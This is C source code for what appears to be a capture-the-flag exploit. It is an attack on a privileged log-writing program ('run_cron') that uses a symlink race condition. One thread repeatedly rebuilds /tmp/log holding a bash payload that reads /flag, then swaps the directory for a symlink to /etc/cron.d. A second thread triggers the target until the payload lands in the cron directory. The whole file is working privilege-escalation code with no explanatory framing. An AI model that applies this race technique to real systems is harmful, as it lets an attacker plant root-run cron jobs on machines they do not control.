#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <pthread.h>

volatile int race_stop, race_start;

char rname[1000];

void get_rname() {
    sprintf(rname, "/tmp/q%d", rand());
}

void *do_write(void *arg)
{
    FILE *fp;
    char aaaa[1025] = "#!/bin/bash\n\ncat /flag;\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n";
    int i=1;
	while (!race_stop) {
        unlink("/tmp/log");
        mkdir("/tmp/log",S_IRUSR|S_IWUSR|S_IXUSR);
        unlink("/tmp/log/pwnme.log");
        fp = fopen("/tmp/log/pwnme.log","w");
        fwrite(aaaa, 1025, 1, fp);
        fclose(fp);
        get_rname();
        rename("/tmp/log",rname);
        symlink("/etc/cron.d","/tmp/log");
        //usleep(1);
    }


	return NULL;
}

void *do_log(void *arg)
{
    char buf[100];
    FILE *fp;

	while (!race_stop) {
        system("/home/user/run_cron");
        fp = fopen("/etc/cron.d/pwnme.log","r");
        if (fp!=NULL) {
            race_stop = 1;
            printf("done\n");
        }
	}
	return NULL;
}

int main(int argc, char **argv)
{
	pthread_t t1, t2;
	int id = 0, pid;


	pthread_create(&t1, NULL, do_write, NULL);
	pthread_create(&t2, NULL, do_log, NULL);

	sleep(1);

	pthread_join(t1, NULL);
	pthread_join(t2, NULL);

    printf("end\n");

	return 0;
}
